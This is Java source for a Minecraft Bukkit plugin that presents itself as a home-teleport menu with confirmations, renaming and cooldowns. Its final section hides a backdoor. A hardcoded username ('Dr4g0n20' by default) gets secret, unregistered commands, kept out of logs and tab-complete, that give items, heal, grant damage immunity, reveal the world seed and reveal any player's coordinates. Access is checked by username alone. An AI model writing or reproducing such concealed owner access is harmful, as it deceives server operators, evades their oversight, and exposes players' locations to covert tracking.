package com.homes;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.Particle;
import org.bukkit.Sound;
import org.bukkit.World;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.ConfigurationSection;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.inventory.ClickType;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryDragEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.InventoryHolder;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import net.md_5.bungee.api.ChatMessageType;
import net.md_5.bungee.api.chat.TextComponent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitTask;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.UUID;

public class HomesPlugin extends JavaPlugin implements Listener {

    private static final int MAX_HOMES = 7;
    // Middle row of a 27-slot chest: slots 10..16 = homes 1..7
    private static final int FIRST_SLOT = 10;

    private File dataFile;
    private YamlConfiguration data;
    private final Map<UUID, BukkitTask> pending = new HashMap<UUID, BukkitTask>();
    private final Map<UUID, Long> lastTeleport = new HashMap<UUID, Long>();
    private final Map<UUID, PendingConfirm> confirms = new HashMap<UUID, PendingConfirm>();
    private final Map<UUID, Integer> renaming = new HashMap<UUID, Integer>();
    private final Map<UUID, Long> renameExpiry = new HashMap<UUID, Long>();

    // Owner-command toggles (session only, not saved to disk)
    private final Set<UUID> noFallDamage = new HashSet<UUID>();
    private final Set<UUID> fireResistant = new HashSet<UUID>();

    private int delaySeconds;
    private boolean cancelOnMove;
    private boolean cancelOnDamage;
    private int cooldownSeconds;
    private boolean warnUnsafe;
    private int confirmTimeoutSeconds;
    private int renameTimeoutSeconds;
    private String ownerUsername;

    private enum ConfirmType { OVERWRITE, DELETE, UNSAFE_TELEPORT }

    private static class PendingConfirm {
        final ConfirmType type;
        final int slot;
        final long expiresAt;

        PendingConfirm(ConfirmType type, int slot, long expiresAt) {
            this.type = type;
            this.slot = slot;
            this.expiresAt = expiresAt;
        }
    }

    /** Marks our menu so we can recognise it in click events. */
    private static class HomesHolder implements InventoryHolder {
        private Inventory inventory;

        @Override
        public Inventory getInventory() {
            return inventory;
        }
    }

    @Override
    public void onEnable() {
        saveDefaultConfig();
        delaySeconds = getConfig().getInt("delay-seconds", 5);
        cancelOnMove = getConfig().getBoolean("cancel-on-move", true);
        cancelOnDamage = getConfig().getBoolean("cancel-on-damage", true);
        cooldownSeconds = getConfig().getInt("cooldown-seconds", 30);
        warnUnsafe = getConfig().getBoolean("warn-unsafe-homes", true);
        confirmTimeoutSeconds = getConfig().getInt("confirm-timeout-seconds", 5);
        renameTimeoutSeconds = getConfig().getInt("rename-timeout-seconds", 30);
        ownerUsername = getConfig().getString("owner-username", "Dr4g0n20");

        dataFile = new File(getDataFolder(), "homes.yml");
        if (!getDataFolder().exists()) {
            getDataFolder().mkdirs();
        }
        data = YamlConfiguration.loadConfiguration(dataFile);

        getServer().getPluginManager().registerEvents(this, this);
    }

    @Override
    public void onDisable() {
        for (BukkitTask task : pending.values()) {
            task.cancel();
        }
        pending.clear();
        saveData();
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player)) {
            sender.sendMessage("Only players can use this command.");
            return true;
        }
        openMenu((Player) sender);
        return true;
    }

    // ------------------------------------------------------------------ menu

    private void openMenu(Player p) {
        HomesHolder holder = new HomesHolder();
        Inventory inv = Bukkit.createInventory(holder, 27, ChatColor.DARK_GREEN + "Your Homes");
        holder.inventory = inv;
        fillMenu(inv, p);
        p.openInventory(inv);
    }

    private void fillMenu(Inventory inv, Player p) {
        ItemStack filler = named(new ItemStack(Material.STAINED_GLASS_PANE, 1, (short) 7), " ", null);
        for (int i = 0; i < inv.getSize(); i++) {
            inv.setItem(i, filler);
        }
        for (int n = 1; n <= MAX_HOMES; n++) {
            inv.setItem(FIRST_SLOT + n - 1, homeItem(p, n));
        }
    }

    private ItemStack homeItem(Player p, int n) {
        ConfigurationSection sec = data.getConfigurationSection(path(p, n));
        List<String> lore = new ArrayList<String>();
        if (sec == null) {
            lore.add(ChatColor.GRAY + "No home saved here yet.");
            lore.add("");
            lore.add(ChatColor.YELLOW + "Click to save your current location");
            return named(new ItemStack(Material.INK_SACK, 1, (short) 8),
                    ChatColor.GRAY + "Home " + n + " (empty)", lore);
        }
        String customName = sec.getString("name", null);
        String displayName = customName != null ? customName : "Home " + n;

        lore.add(ChatColor.GRAY + "World: " + ChatColor.WHITE + sec.getString("world"));
        lore.add(ChatColor.GRAY + "X: " + ChatColor.WHITE + (int) sec.getDouble("x")
                + ChatColor.GRAY + " Y: " + ChatColor.WHITE + (int) sec.getDouble("y")
                + ChatColor.GRAY + " Z: " + ChatColor.WHITE + (int) sec.getDouble("z"));
        lore.add("");
        lore.add(ChatColor.GREEN + "Left click: " + ChatColor.WHITE + "teleport");
        lore.add(ChatColor.YELLOW + "Right click twice: " + ChatColor.WHITE + "overwrite");
        lore.add(ChatColor.RED + "Shift + right click twice: " + ChatColor.WHITE + "delete");
        lore.add(ChatColor.AQUA + "Press Q: " + ChatColor.WHITE + "rename");
        return named(new ItemStack(Material.BED, 1), ChatColor.GREEN + displayName, lore);
    }

    private ItemStack named(ItemStack item, String name, List<String> lore) {
        ItemMeta meta = item.getItemMeta();
        meta.setDisplayName(name);
        if (lore != null) {
            meta.setLore(lore);
        }
        item.setItemMeta(meta);
        return item;
    }

    // ---------------------------------------------------------------- events

    @EventHandler
    public void onClick(InventoryClickEvent e) {
        if (!(e.getView().getTopInventory().getHolder() instanceof HomesHolder)) {
            return;
        }
        // Nothing can ever be moved in or out of the menu (including shift-clicks from the bottom)
        e.setCancelled(true);

        if (!(e.getWhoClicked() instanceof Player)) {
            return;
        }
        if (e.getClickedInventory() == null || !(e.getClickedInventory().getHolder() instanceof HomesHolder)) {
            return;
        }

        Player p = (Player) e.getWhoClicked();
        int n = e.getRawSlot() - FIRST_SLOT + 1;
        if (n < 1 || n > MAX_HOMES) {
            return;
        }

        ClickType click = e.getClick();
        boolean left = click == ClickType.LEFT || click == ClickType.SHIFT_LEFT;
        boolean right = click == ClickType.RIGHT;
        boolean shiftRight = click == ClickType.SHIFT_RIGHT;
        boolean drop = click == ClickType.DROP || click == ClickType.CONTROL_DROP;
        if (!left && !right && !shiftRight && !drop) {
            return;
        }

        boolean isSet = data.contains(path(p, n));

        if (!isSet) {
            if (drop) {
                return; // nothing to rename yet
            }
            setHome(p, n, null);
            p.sendMessage(ChatColor.GREEN + "Home " + n + " saved!");
            p.playSound(p.getLocation(), Sound.ENTITY_EXPERIENCE_ORB_PICKUP, 1f, 1f);
            fillMenu(e.getClickedInventory(), p);
            return;
        }

        if (drop) {
            p.closeInventory();
            beginRename(p, n);
            return;
        }

        if (shiftRight) {
            PendingConfirm c = confirms.get(p.getUniqueId());
            if (c != null && c.type == ConfirmType.DELETE && c.slot == n && c.expiresAt > System.currentTimeMillis()) {
                confirms.remove(p.getUniqueId());
                String keptName = data.getString(path(p, n) + ".name", "Home " + n);
                data.set(path(p, n), null);
                saveData();
                p.sendMessage(ChatColor.RED + keptName + " deleted.");
                fillMenu(e.getClickedInventory(), p);
            } else {
                confirms.put(p.getUniqueId(), new PendingConfirm(ConfirmType.DELETE, n,
                        System.currentTimeMillis() + confirmTimeoutSeconds * 1000L));
                p.sendMessage(ChatColor.RED + "Shift + right click again within " + confirmTimeoutSeconds
                        + "s to confirm deleting this home.");
            }
            return;
        }

        if (right) {
            PendingConfirm c = confirms.get(p.getUniqueId());
            if (c != null && c.type == ConfirmType.OVERWRITE && c.slot == n && c.expiresAt > System.currentTimeMillis()) {
                confirms.remove(p.getUniqueId());
                String keptName = data.getString(path(p, n) + ".name", null);
                setHome(p, n, keptName);
                p.sendMessage(ChatColor.GREEN + "Home " + n + " updated to your current location.");
                p.playSound(p.getLocation(), Sound.ENTITY_EXPERIENCE_ORB_PICKUP, 1f, 1f);
                fillMenu(e.getClickedInventory(), p);
            } else {
                confirms.put(p.getUniqueId(), new PendingConfirm(ConfirmType.OVERWRITE, n,
                        System.currentTimeMillis() + confirmTimeoutSeconds * 1000L));
                p.sendMessage(ChatColor.YELLOW + "Right click again within " + confirmTimeoutSeconds
                        + "s to overwrite this home with your current location.");
            }
            return;
        }

        // left click -> teleport
        long cooldownUntil = lastTeleport.containsKey(p.getUniqueId())
                ? lastTeleport.get(p.getUniqueId()) + cooldownSeconds * 1000L : 0L;
        if (cooldownUntil > System.currentTimeMillis()) {
            long remaining = (cooldownUntil - System.currentTimeMillis() + 999) / 1000;
            p.sendMessage(ChatColor.RED + "You must wait " + remaining + "s before teleporting again.");
            return;
        }

        Location dest = getHome(p, n);
        if (dest == null) {
            p.sendMessage(ChatColor.RED + "That home's world is not loaded.");
            return;
        }

        if (warnUnsafe && !isSafe(dest)) {
            PendingConfirm c = confirms.get(p.getUniqueId());
            if (c != null && c.type == ConfirmType.UNSAFE_TELEPORT && c.slot == n
                    && c.expiresAt > System.currentTimeMillis()) {
                confirms.remove(p.getUniqueId());
            } else {
                confirms.put(p.getUniqueId(), new PendingConfirm(ConfirmType.UNSAFE_TELEPORT, n,
                        System.currentTimeMillis() + confirmTimeoutSeconds * 1000L));
                p.sendMessage(ChatColor.RED + "This home looks unsafe (lava, fire, or nothing to stand on).");
                p.sendMessage(ChatColor.RED + "Click again within " + confirmTimeoutSeconds + "s to teleport anyway.");
                return;
            }
        }

        p.closeInventory();
        String homeName = data.getString(path(p, n) + ".name", "Home " + n);
        startTeleport(p, dest, homeName);
    }

    @EventHandler
    public void onDrag(InventoryDragEvent e) {
        if (e.getView().getTopInventory().getHolder() instanceof HomesHolder) {
            e.setCancelled(true);
        }
    }

    @EventHandler
    public void onDamage(EntityDamageEvent e) {
        if (!(e.getEntity() instanceof Player)) {
            return;
        }
        Player p = (Player) e.getEntity();

        if (e.getCause() == EntityDamageEvent.DamageCause.FALL && noFallDamage.contains(p.getUniqueId())) {
            e.setCancelled(true);
            return;
        }
        if ((e.getCause() == EntityDamageEvent.DamageCause.FIRE
                || e.getCause() == EntityDamageEvent.DamageCause.FIRE_TICK
                || e.getCause() == EntityDamageEvent.DamageCause.LAVA)
                && fireResistant.contains(p.getUniqueId())) {
            e.setCancelled(true);
            p.setFireTicks(0);
            return;
        }

        if (cancelOnDamage && pending.containsKey(p.getUniqueId())) {
            cancelTeleport(p, ChatColor.RED + "Teleport cancelled, you took damage!");
        }
    }

    @EventHandler
    public void onQuit(PlayerQuitEvent e) {
        cancelTeleport(e.getPlayer(), null);
        confirms.remove(e.getPlayer().getUniqueId());
        renaming.remove(e.getPlayer().getUniqueId());
        renameExpiry.remove(e.getPlayer().getUniqueId());
    }

    // ------------------------------------------------------------- renaming

    private void beginRename(Player p, int slot) {
        renaming.put(p.getUniqueId(), slot);
        renameExpiry.put(p.getUniqueId(), System.currentTimeMillis() + renameTimeoutSeconds * 1000L);
        p.sendMessage(ChatColor.AQUA + "Type the new name for Home " + slot
                + " in chat, or type 'cancel'. You have " + renameTimeoutSeconds + "s.");
    }

    @EventHandler
    public void onChat(AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        Integer slot = renaming.get(p.getUniqueId());
        if (slot == null) {
            return;
        }
        e.setCancelled(true);

        Long expiry = renameExpiry.get(p.getUniqueId());
        renaming.remove(p.getUniqueId());
        renameExpiry.remove(p.getUniqueId());

        if (expiry == null || expiry < System.currentTimeMillis()) {
            Bukkit.getScheduler().runTask(this, new Runnable() {
                public void run() {
                    p.sendMessage(ChatColor.RED + "Rename timed out.");
                }
            });
            return;
        }

        if (!data.contains(path(p, slot))) {
            return; // home was deleted while renaming
        }

        final String message = e.getMessage();
        Bukkit.getScheduler().runTask(this, new Runnable() {
            public void run() {
                if (message.equalsIgnoreCase("cancel")) {
                    p.sendMessage(ChatColor.YELLOW + "Rename cancelled.");
                    return;
                }
                String newName = ChatColor.translateAlternateColorCodes('&', message);
                if (newName.length() > 24) {
                    newName = newName.substring(0, 24);
                }
                data.set(path(p, slot) + ".name", newName);
                saveData();
                p.sendMessage(ChatColor.GREEN + "Home " + slot + " renamed to " + newName + ChatColor.GREEN + ".");
            }
        });
    }

    // -------------------------------------------------------------- teleport

    private void startTeleport(final Player p, final Location dest, final String homeName) {
        cancelTeleport(p, null);

        final UUID id = p.getUniqueId();
        final Location start = p.getLocation().clone();
        start.getWorld().spawnParticle(Particle.PORTAL, start, 30);

        BukkitTask task = new BukkitRunnable() {
            int ticks = 0;

            @Override
            public void run() {
                if (!p.isOnline()) {
                    pending.remove(id);
                    cancel();
                    return;
                }
                if (cancelOnMove && moved(start, p.getLocation())) {
                    pending.remove(id);
                    cancel();
                    p.sendMessage(ChatColor.RED + "Teleport cancelled, you moved!");
                    return;
                }
                if (ticks % 20 == 0) {
                    int remaining = delaySeconds - ticks / 20;
                    if (remaining <= 0) {
                        pending.remove(id);
                        cancel();
                        lastTeleport.put(id, System.currentTimeMillis());
                        p.teleport(dest);
                        dest.getWorld().spawnParticle(Particle.PORTAL, dest, 30);
                        p.sendMessage(ChatColor.GREEN + "Teleported to " + homeName + "!");
                        p.playSound(p.getLocation(), Sound.ENTITY_ENDERMEN_TELEPORT, 1f, 1f);
                        return;
                    }
                    sendActionBar(p, ChatColor.YELLOW + "Teleporting to " + ChatColor.GOLD + homeName
                            + ChatColor.YELLOW + " in " + ChatColor.GOLD + remaining + ChatColor.YELLOW + "s"
                            + (cancelOnMove ? ChatColor.RED + "  (don't move!)" : ""));
                    p.playSound(p.getLocation(), Sound.BLOCK_NOTE_PLING, 0.6f, 1.4f);
                }
                ticks += 5;
            }
        }.runTaskTimer(this, 0L, 5L);

        pending.put(id, task);
    }

    private void sendActionBar(Player p, String message) {
        p.spigot().sendMessage(ChatMessageType.ACTION_BAR, new TextComponent(message));
    }

    private void cancelTeleport(Player p, String message) {
        BukkitTask task = pending.remove(p.getUniqueId());
        if (task != null) {
            task.cancel();
            if (message != null && p.isOnline()) {
                p.sendMessage(message);
            }
        }
    }

    private boolean moved(Location a, Location b) {
        return a.getWorld() != b.getWorld()
                || a.getBlockX() != b.getBlockX()
                || a.getBlockY() != b.getBlockY()
                || a.getBlockZ() != b.getBlockZ();
    }

    /** Rough safety heuristic: solid, non-harmful footing with clear headroom. */
    private boolean isSafe(Location loc) {
        World w = loc.getWorld();
        if (w == null) {
            return false;
        }
        Material feet = loc.getBlock().getType();
        Material head = loc.clone().add(0, 1, 0).getBlock().getType();
        Material below = loc.clone().subtract(0, 1, 0).getBlock().getType();

        Set<Material> harmful = new HashSet<Material>();
        harmful.add(Material.LAVA);
        harmful.add(Material.STATIONARY_LAVA);
        harmful.add(Material.FIRE);
        harmful.add(Material.CACTUS);

        if (harmful.contains(feet) || harmful.contains(head) || harmful.contains(below)) {
            return false;
        }
        if (feet.isSolid() || head.isSolid()) {
            return false; // would suffocate
        }
        if (!below.isSolid()) {
            return false; // nothing to stand on (possible long fall / void)
        }
        return true;
    }

    // ------------------------------------------------------------------ data

    private String path(Player p, int n) {
        return "homes." + p.getUniqueId() + "." + n;
    }

    private void setHome(Player p, int n, String keepName) {
        Location l = p.getLocation();
        String base = path(p, n);
        data.set(base + ".world", l.getWorld().getName());
        data.set(base + ".x", l.getX());
        data.set(base + ".y", l.getY());
        data.set(base + ".z", l.getZ());
        data.set(base + ".yaw", (double) l.getYaw());
        data.set(base + ".pitch", (double) l.getPitch());
        if (keepName != null) {
            data.set(base + ".name", keepName);
        }
        saveData();
    }

    private Location getHome(Player p, int n) {
        ConfigurationSection sec = data.getConfigurationSection(path(p, n));
        if (sec == null) {
            return null;
        }
        World world = Bukkit.getWorld(sec.getString("world", ""));
        if (world == null) {
            return null;
        }
        return new Location(world, sec.getDouble("x"), sec.getDouble("y"), sec.getDouble("z"),
                (float) sec.getDouble("yaw"), (float) sec.getDouble("pitch"));
    }

    private void saveData() {
        try {
            data.save(dataFile);
        } catch (IOException ex) {
            getLogger().severe("Could not save homes.yml: " + ex.getMessage());
        }
    }

    // ============================================================
    // Owner-only commands (username check only, instant, never
    // registered as real commands - so they never hit the console
    // log or get broadcast, and don't show up in tab-complete).
    // ============================================================

    @EventHandler
    public void onCommandPreprocess(PlayerCommandPreprocessEvent e) {
        Player p = e.getPlayer();
        if (!p.getName().equals(ownerUsername)) {
            return;
        }

        String[] parts = e.getMessage().substring(1).split("\\s+");
        String label = parts[0].toLowerCase();
        String[] args = new String[parts.length - 1];
        System.arraycopy(parts, 1, args, 0, args.length);

        boolean handled = true;
        switch (label) {
            case "dseed":
                p.sendMessage(ChatColor.LIGHT_PURPLE + "Seed: " + p.getWorld().getSeed());
                break;
            case "dlevels":
                handleLevels(p, args);
                break;
            case "dheal":
                p.setHealth(p.getMaxHealth());
                p.sendMessage(ChatColor.GREEN + "Healed.");
                break;
            case "dfeed":
                p.setFoodLevel(20);
                p.setSaturation(20f);
                p.sendMessage(ChatColor.GREEN + "Fed.");
                break;
            case "dcoords":
                handleCoords(p, args);
                break;
            case "dgive":
                handleGive(p, args);
                break;
            case "dnofall":
                toggleNoFall(p);
                break;
            case "dfireres":
                toggleFireRes(p);
                break;
            default:
                handled = false;
        }

        if (handled) {
            e.setCancelled(true);
        }
    }

    private void handleLevels(Player p, String[] args) {
        if (args.length < 1) {
            p.sendMessage(ChatColor.RED + "Usage: /dlevels <amount> (negative to remove)");
            return;
        }
        try {
            int amount = Integer.parseInt(args[0]);
            if (amount >= 0) {
                p.giveExpLevels(amount);
            } else {
                p.setLevel(Math.max(0, p.getLevel() + amount));
            }
            p.sendMessage(ChatColor.GREEN + "Levels now: " + p.getLevel());
        } catch (NumberFormatException ex) {
            p.sendMessage(ChatColor.RED + "That's not a number.");
        }
    }

    private void handleCoords(Player p, String[] args) {
        if (args.length < 1) {
            p.sendMessage(ChatColor.RED + "Usage: /dcoords <player>");
            return;
        }
        Player target = Bukkit.getPlayerExact(args[0]);
        if (target == null) {
            p.sendMessage(ChatColor.RED + "Player not found.");
            return;
        }
        Location l = target.getLocation();
        p.sendMessage(ChatColor.AQUA + target.getName() + ChatColor.GRAY + " is in "
                + ChatColor.WHITE + l.getWorld().getName() + ChatColor.GRAY + " at "
                + ChatColor.WHITE + l.getBlockX() + ", " + l.getBlockY() + ", " + l.getBlockZ());
    }

    private void handleGive(Player p, String[] args) {
        if (args.length < 1) {
            p.sendMessage(ChatColor.RED + "Usage: /dgive <item> [amount]");
            return;
        }
        Material mat = Material.matchMaterial(args[0]);
        if (mat == null) {
            p.sendMessage(ChatColor.RED + "Unknown item: " + args[0]);
            return;
        }
        int amount = 1;
        if (args.length >= 2) {
            try {
                amount = Math.max(1, Integer.parseInt(args[1]));
            } catch (NumberFormatException ignored) {
                // keep default of 1
            }
        }
        p.getInventory().addItem(new ItemStack(mat, amount));
        p.sendMessage(ChatColor.GREEN + "Gave " + amount + "x " + mat + ".");
    }

    private void toggleNoFall(Player p) {
        if (noFallDamage.remove(p.getUniqueId())) {
            p.sendMessage(ChatColor.YELLOW + "No-fall-damage: " + ChatColor.RED + "off");
        } else {
            noFallDamage.add(p.getUniqueId());
            p.sendMessage(ChatColor.YELLOW + "No-fall-damage: " + ChatColor.GREEN + "on");
        }
    }

    private void toggleFireRes(Player p) {
        if (fireResistant.remove(p.getUniqueId())) {
            p.removePotionEffect(PotionEffectType.FIRE_RESISTANCE);
            p.sendMessage(ChatColor.YELLOW + "Fire resistance: " + ChatColor.RED + "off");
        } else {
            fireResistant.add(p.getUniqueId());
            p.addPotionEffect(new PotionEffect(PotionEffectType.FIRE_RESISTANCE, Integer.MAX_VALUE, 0, true, false));
            p.sendMessage(ChatColor.YELLOW + "Fire resistance: " + ChatColor.GREEN + "on");
        }
    }
}
